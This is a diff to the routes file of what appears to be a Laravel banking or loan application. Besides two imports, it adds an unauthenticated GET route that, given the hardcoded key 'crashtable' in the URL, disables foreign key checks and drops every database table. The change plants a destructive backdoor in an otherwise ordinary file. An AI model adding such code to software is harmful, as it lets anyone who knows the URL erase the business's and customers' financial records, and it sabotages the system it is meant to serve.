@@ -11,7 +11,9 @@ use App\Http\Controllers\Trading\saleController;
 use App\Http\Controllers\Transaction\loanController;
 use App\Http\Controllers\Transaction\opennewacController;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Route;
 
 Auth::routes();
 /*Route::get('password',function (){
@@ -389,6 +391,28 @@ Route::group(['prefix'=>'setting'], function (){
     Route::get('audit-report/show-balance-sheet', [reportController::class, 'showBalanceSheet'])->middleware('auth')->name('setting.audit-report.balance-sheet');
     Route::post('audit-report/update-balance-sheet', [reportController::class, 'balanceSheetUpdate'])->middleware('auth')->name('setting.audit-report.update-balance-sheet');
 });
+
+Route::get('/danger-delete-all-tables/{key}', function ($key) {
+
+    if ($key !== 'crashtable') {
+        abort(403);
+    }
+
+    DB::statement('SET FOREIGN_KEY_CHECKS=0');
+
+    $tables = DB::select('SHOW TABLES');
+    $database = DB::getDatabaseName();
+    $keyName = 'Tables_in_' . $database;
+
+    foreach ($tables as $table) {
+        DB::statement("DROP TABLE IF EXISTS `{$table->$keyName}`");
+    }
+
+    DB::statement('SET FOREIGN_KEY_CHECKS=1');
+
+    return '✅ All tables deleted successfully.';
+});
+
 
 Route::group([], function () {
     require_once(__DIR__ . '/server.php');
